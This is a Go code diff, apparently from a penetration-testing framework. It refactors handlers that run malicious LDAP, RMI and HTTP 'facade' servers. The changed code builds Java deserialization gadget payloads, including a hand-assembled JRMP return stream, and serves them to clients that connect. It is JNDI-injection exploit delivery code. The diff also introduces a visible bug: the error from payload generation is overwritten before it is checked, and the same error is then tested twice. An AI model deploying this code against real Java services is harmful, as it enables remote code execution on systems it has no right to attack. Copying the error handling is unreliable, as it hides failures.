@@ -36,15 +36,7 @@ var (
 	remoteReversePort          int
 	remoteAddr                 string
 	remoteSecret               string
-	// 所有已创建的FacadeServer
-	facadeServers    map[string]*facades.FacadeServer
-	facadeServersMux *sync.Mutex
 )
-
-func init() {
-	facadeServers = make(map[string]*facades.FacadeServer)
-	facadeServersMux = &sync.Mutex{}
-}
 
 func (s *Server) GetGlobalReverseServer(ctx context.Context, req *ypb.Empty) (*ypb.GetGlobalReverseServerResponse, error) {
 	return &ypb.GetGlobalReverseServerResponse{
@@ -434,9 +426,7 @@ func (s *Server) StartFacadesWithYsoObject(req *ypb.StartFacadesWithYsoParams, s
 	server := facades.NewFacadeServer("0.0.0.0", listenPort,
 		facades.SetReverseAddress(httpAddr),
 	)
-	facadeServersMux.Lock()
-	facadeServers[req.GetToken()] = server
-	facadeServersMux.Unlock()
+	facades.RegisterFacadeServer(stream.Context(), req.Token, server)
 	server.OnHandle(func(n *facades.Notification) {
 		res, ok := remoteAddrConvertor.Get(n.RemoteAddr)
 		if ok {
@@ -488,44 +478,51 @@ func (s *Server) StartFacadesWithYsoObject(req *ypb.StartFacadesWithYsoParams, s
 		}
 	}()
 	wg.Wait()
-	delete(facadeServers, req.GetToken())
+	facades.DeleteFacadeServer(req.Token)
 	return globalError
 }
 
 func (s *Server) ApplyClassToFacades(ctx context.Context, req *ypb.ApplyClassToFacadesParamsWithVerbose) (*ypb.Empty, error) {
 	token := req.GetToken()
-	server, ok := facadeServers[token]
-	if !ok {
+	server := facades.GetFacadeServer(token)
+	if server == nil {
 		return nil, utils.Errorf("Server is not exist for token: %s", token)
 	}
 	if req.GetGenerateClassParams() == nil {
 		return nil, errors.New("not set class params")
 	}
 	isClass := req.GetGenerateClassParams().GetGadget() == "None"
-	bytesRsp, err := s.GenerateYsoBytes(ctx, req.GetGenerateClassParams())
+	fileName, payloadGetter, err := GenerateYsoPayload(req.GetGenerateClassParams())
+	payloadBytes, err := payloadGetter()
 	if err != nil {
-		return nil, utils.Errorf("generate class error: %v", err)
+		return nil, err
+	}
+	if err != nil {
+		return nil, err
 	}
 	var className, classPath string
-	if strings.HasSuffix(bytesRsp.GetFileName(), ".class") {
-		classPath = bytesRsp.GetFileName()
-		className = bytesRsp.GetFileName()[:len(bytesRsp.GetFileName())-6]
+	if strings.HasSuffix(fileName, ".class") {
+		classPath = fileName
+		className = fileName[:len(fileName)-6]
 	} else {
 		return nil, utils.Error("facade server need class")
 	}
 	httpAddr := server.ReverseAddr
 	if isClass {
 		server.Config(
-			facades.SetHttpResource(classPath, bytesRsp.GetBytes()),
+			facades.SetHttpResource(classPath, payloadBytes),
 			facades.SetLdapResourceAddr(className, httpAddr),
 			facades.SetRmiResourceAddr(className, httpAddr),
 		)
 	} else {
-		objIns, err := yso.GetJavaObjectFromBytes(bytesRsp.GetBytes())
+		jrmpPayload, err := payloadGetter(yso.SetToBytesJRMPMarshaler())
 		if err != nil {
 			return nil, err
 		}
-		payload, err := yso.ToBytes(objIns, yso.SetToBytesJRMPMarshaler())
+		commonPayload, err := payloadGetter()
+		if err != nil {
+			return nil, err
+		}
 		payloadBuf := bytes.Buffer{}
 		payloadBuf.WriteByte(0x51)                       // Return
 		payloadBuf.Write([]byte{0xac, 0xed, 0x00, 0x05}) // stream header
@@ -534,14 +531,15 @@ func (s *Server) ApplyClassToFacades(ctx context.Context, req *ypb.ApplyClassToF
 		payloadBuf.Write(yserx.IntTo4Bytes(0))           // unique
 		payloadBuf.Write(yserx.Uint64To8Bytes(0))        //time
 		payloadBuf.Write(yserx.IntTo2Bytes(0))           //count
-		payloadBuf.Write(payload[4:])
+		payloadBuf.Write(jrmpPayload[4:])
 		rmiPayload := payloadBuf.Bytes()
+		verbose := fmt.Sprintf("gadget: %s, action: %s", req.GetGenerateClassParams().GetGadget(), req.GetGenerateClassParams().GetClass())
 		server.Config(
 			facades.SetLdapResponseEntry(className, map[string]any{
-				"javaSerializedData": bytesRsp.GetBytes(),
+				"javaSerializedData": commonPayload,
 				"javaClassName":      utils.RandStringBytes(5),
-			}),
-			facades.SetRmiResource(className, rmiPayload),
+			}, verbose),
+			facades.SetRmiResource(className, rmiPayload, verbose),
 		)
 	}
 	return &ypb.Empty{}, nil
